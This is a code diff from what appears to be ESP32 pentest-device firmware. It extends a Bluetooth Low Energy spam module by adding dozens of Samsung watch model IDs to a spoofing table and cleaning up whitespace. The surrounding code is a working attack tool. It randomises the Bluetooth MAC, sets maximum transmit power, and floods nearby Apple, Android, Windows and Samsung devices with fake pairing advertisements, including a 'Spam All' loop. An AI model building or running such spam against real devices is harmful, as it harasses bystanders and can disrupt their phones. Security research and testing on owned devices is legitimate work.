@@ -77,13 +77,19 @@ const DeviceType android_models[] = {
     {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
 };
 
-const WatchModel watch_models[26] = {
+const WatchModel watch_models[] = {
     {0x1A}, {0x01}, {0x02}, {0x03}, {0x04},
     {0x05}, {0x06}, {0x07}, {0x08}, {0x09},
     {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12},
     {0x13}, {0x14}, {0x15}, {0x16}, {0x17},
     {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E},
-    {0x20}
+    {0x20},
+    {0x43}, {0x44}, {0x45}, {0x46}, {0x47},
+    {0x48}, {0x49}, {0x4A}, {0x4B}, {0x4C},
+    {0x4D}, {0x4E}, {0x4F}, {0x50}, {0x51},
+    {0x52}, {0x53}, {0x54}, {0x55}, {0x56},
+    {0x57}, {0x58}, {0x59}, {0x5A}, {0x5B},
+    {0x5C}, {0x5D}
 };
 
 char randomNameBuffer[32];
@@ -105,6 +111,7 @@ void generateRandomMac(uint8_t *mac) {
 }
 
 int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
+int watch_models_count = (sizeof(watch_models) / sizeof(watch_models[0]));
 
 BLEAdvertising *pAdvertising;
 
@@ -196,7 +203,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             break;
         }
         case Samsung: {
-            uint8_t model = watch_models[random(26)].value;
+            uint8_t model = watch_models[random(watch_models_count)].value;
             uint8_t Samsung_Data[15] = {
                 0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02,
                 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
@@ -237,7 +244,6 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
 }
 
 void executeSpam(EBLEPayloadType type) {
-    
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
@@ -274,13 +280,9 @@ void executeCustomSpam(String spamName) {
     esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
 
     BLEDevice::init("sh4rk");
-
     vTaskDelay(5 / portTICK_PERIOD_MS);
-
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-
     pAdvertising = BLEDevice::getAdvertising();
-
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
 
     advertisementData.setFlags(0x06);
@@ -346,20 +348,20 @@ void aj_adv(int ble_choice) {
     int count = 0;
     String spamName = "";
     if (ble_choice == 6) { spamName = keyboard("", 10, "Name to spam"); }
-    
+
     if (ble_choice == 5) {
         displayTextLine("Spam All Sequential");
         padprintln("");
         padprintln("Press ESC to stop");
-        
+
         while (1) {
             if (check(EscPress)) {
                 returnToMenu = true;
                 break;
             }
-            
+
             int protocol = count % 7;
-            
+
             switch(protocol) {
                 case 0:
                     displayTextLine("Android " + String(count));
@@ -390,15 +392,15 @@ void aj_adv(int ble_choice) {
                     executeSpam(AppleJuice);
                     break;
             }
-            
+
             count++;
-            
+
             if (check(EscPress)) {
                 returnToMenu = true;
                 break;
             }
         }
-        
+
         BLEDevice::init("");
         vTaskDelay(100 / portTICK_PERIOD_MS);
         pAdvertising = nullptr;
@@ -410,7 +412,7 @@ void aj_adv(int ble_choice) {
 #endif
         return;
     }
-    
+
     while (1) {
         switch (ble_choice) {
             case 0:
@@ -464,18 +466,14 @@ void aj_adv(int ble_choice) {
 
 void legacySubMenu() {
     std::vector<Option> legacyOptions;
-    
     legacyOptions.push_back({"SourApple", []() { aj_adv(7); }});
     legacyOptions.push_back({"AppleJuice", []() { aj_adv(8); }});
-    
-    
     legacyOptions.push_back({"Back", []() { returnToMenu = true; }});
-    
     loopOptions(legacyOptions, MENU_TYPE_SUBMENU, "Apple Spam (Legacy)");
 }
+
 void spamMenu() {
     std::vector<Option> options;
-
     options.push_back({"Apple Spam", [=]() { appleSubMenu(); }});
     options.push_back({"Apple Spam (Legacy)", [=]() { legacySubMenu(); }});
     options.push_back({"Windows Spam", lambdaHelper(aj_adv, 2)});
@@ -484,6 +482,5 @@ void spamMenu() {
     options.push_back({"Spam All", lambdaHelper(aj_adv, 5)});
     options.push_back({"Spam Custom", lambdaHelper(aj_adv, 6)});
     options.push_back({"Back", []() { returnToMenu = true; }});
-     
     loopOptions(options, MENU_TYPE_SUBMENU, "Bluetooth Spam");
 }
